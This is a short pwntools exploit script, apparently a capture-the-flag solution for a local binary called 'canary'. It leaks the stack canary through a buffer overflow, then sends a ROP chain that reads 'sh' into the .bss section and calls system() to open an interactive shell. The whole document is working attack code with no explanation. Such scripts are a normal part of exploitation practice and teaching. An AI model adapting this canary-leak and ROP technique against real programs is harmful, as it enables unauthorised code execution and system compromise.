from pwn import *

context.arch = "amd64"
context.log_level = "debug"

elf = ELF("../attachments/canary")
io = process("../attachments/canary")

payload = cyclic(0x50 - 0x8 + 1)
io.sendafter(b"Enter your message (type 'exit' to quit): ", payload)
io.recvuntil(payload)

canary = b"\x00" + io.recv(7)
success(f"canary => {canary.hex()}")

pop_rdi_ret = 0x0000000000401383
pop_rsi_r15_ret = 0x0000000000401381
ret = 0x000000000040101A

payload = flat(
    cyclic(0x50 - 0x8),
    canary,
    b"\x00" * 8,
    [
        pop_rdi_ret,
        0,
        pop_rsi_r15_ret,
        elf.bss() + 0x100,
        0,
        elf.symbols["read"],
    ],
    ret,
    [
        pop_rdi_ret,
        elf.bss() + 0x100,
        elf.symbols["system"],
    ],
)
io.sendafter(b"Enter your message (type 'exit' to quit): ", payload)
io.sendafter(b"Enter your message (type 'exit' to quit): ", b"exit")
io.send(b"sh")

io.interactive()
